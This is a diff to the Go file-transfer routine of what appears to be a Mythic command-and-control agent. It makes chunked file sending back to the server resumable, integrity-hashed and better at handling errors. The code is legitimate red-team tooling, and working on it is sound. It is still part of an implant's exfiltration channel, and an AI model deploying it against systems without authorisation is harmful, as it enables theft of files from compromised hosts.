@@ -12,6 +12,7 @@ import (
 	"strings"
 )
 
+
 var SendToMythicChannel = make(chan structs.SendFileToMythicStruct, 10)
 
 // listenForSendFileToMythicMessages reads from SendToMythicChannel to send file transfer messages to Mythic
@@ -105,9 +106,18 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 		return
 	}
 
+	fileID, ok := fileDetails["file_id"].(string)
+	if !ok {
+		errResponse := sendFileToMythic.Task.NewResponse()
+		errResponse.UserOutput = "Error: file_id not found or not a string in server response"
+		sendFileToMythic.Task.Job.SendResponses <- errResponse
+		sendFileToMythic.FinishedTransfer <- 1
+		return
+	}
+
 	updateUserOutput := structs.Response{}
 	updateUserOutput.TaskID = sendFileToMythic.Task.ID
-	updateUserOutput.UserOutput = fmt.Sprintf("{\"file_id\": \"%v\", \"total_chunks\": \"%d\"}\n", fileDetails["file_id"], chunks)
+	updateUserOutput.UserOutput = fmt.Sprintf("{\"file_id\": \"%v\", \"total_chunks\": \"%d\"}\n", fileID, chunks)
 	sendFileToMythic.Task.Job.SendResponses <- updateUserOutput
 
 	var r *bytes.Buffer = nil
@@ -123,10 +133,21 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 		}
 	}
 
+	// Initialize streaming hash for integrity verification
+	hasher := NewStreamingHasher()
+
 	lastPercentCompleteNotified := 0
 	for i := uint64(0); i < chunks; {
 		if sendFileToMythic.Task.ShouldStop() {
-			// Tasked to stop, so bail
+			// Save resume state so we can pick up later
+			SaveTransferState(&TransferState{
+				FileID:      fileID,
+				FullPath:    sendFileToMythic.FullPath,
+				Direction:   TransferDownload,
+				TotalChunks: int(chunks),
+				LastChunk:   int(i),
+				BytesSoFar:  hasher.BytesHashed(),
+			})
 			sendFileToMythic.FinishedTransfer <- 1
 			return
 		}
@@ -163,17 +184,11 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 			}
 		}
 
+		// Update running hash with this chunk's data
+		hasher.Write(partBuffer)
+
 		fileDownloadData = structs.FileDownloadMessage{}
 		fileDownloadData.ChunkNum = int(i) + 1
-		fileID, ok := fileDetails["file_id"].(string)
-		if !ok {
-			errResponse := sendFileToMythic.Task.NewResponse()
-			errResponse.Completed = true
-			errResponse.UserOutput = "Error: file_id not found or not a string in server response"
-			sendFileToMythic.Task.Job.SendResponses <- errResponse
-			sendFileToMythic.FinishedTransfer <- 1
-			return
-		}
 		fileDownloadData.FileID = fileID
 		fileDownloadData.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
 		fileDownloadMsg.Download = &fileDownloadData
@@ -191,6 +206,15 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 		// Wait for a response for our file chunk with timeout
 		decResp, ok := waitForFileResponse(sendFileToMythic.FileTransferResponse, fileTransferTimeout)
 		if !ok {
+			// Save resume state on timeout
+			SaveTransferState(&TransferState{
+				FileID:      fileID,
+				FullPath:    sendFileToMythic.FullPath,
+				Direction:   TransferDownload,
+				TotalChunks: int(chunks),
+				LastChunk:   int(i),
+				BytesSoFar:  hasher.BytesHashed(),
+			})
 			errResponse := sendFileToMythic.Task.NewResponse()
 			errResponse.UserOutput = fmt.Sprintf("File transfer timed out waiting for chunk %d/%d acknowledgment from server", int(i)+1, chunks)
 			sendFileToMythic.Task.Job.SendResponses <- errResponse
@@ -214,5 +238,19 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 			i++
 		}
 	}
+
+	// Transfer complete — clear any resume state and store result
+	ClearTransferState(sendFileToMythic.FullPath)
+
+	// Store transfer result for the calling command to access
+	if sendFileToMythic.TransferResult != nil {
+		*sendFileToMythic.TransferResult = structs.FileTransferResult{
+			FileID:    fileID,
+			SHA256:    hasher.Sum(),
+			BytesSent: hasher.BytesHashed(),
+			Chunks:    int(chunks),
+		}
+	}
+
 	sendFileToMythic.FinishedTransfer <- 1
 }
